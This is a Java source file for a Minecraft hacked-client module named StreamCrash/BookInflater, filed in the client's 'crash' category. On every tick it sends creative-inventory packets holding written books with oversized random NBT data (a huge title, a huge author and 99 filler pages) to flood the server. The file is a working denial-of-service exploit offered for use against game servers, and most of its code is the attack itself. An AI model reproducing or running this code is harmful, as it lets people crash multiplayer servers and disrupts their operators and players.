/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.util.Utils;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class StreamCrash extends Module {

    int slot = 0;

    public StreamCrash() {
        super("BookInflater", "Writes a book thats nbt value is 3x bigger than normal", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        for(int i = 0; i < 5; i++){
            if(slot > 36 + 9){
                slot = 0;
                return;
            }
            slot++;
            ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
            NbtCompound tag = new NbtCompound();
            NbtList list = new NbtList();
            for (int j = 0; j < 99; j++) {
                list.add(NbtString.of("{\"text\":"+ Utils.rndStr(200) + "\"}"));
            }
            tag.put("author", NbtString.of(Utils.rndStr(9000)));
            tag.put("title", NbtString.of(Utils.rndStr(25564)));
            tag.put("pages", list);
            crash.setNbt(tag);
            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot, crash));
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
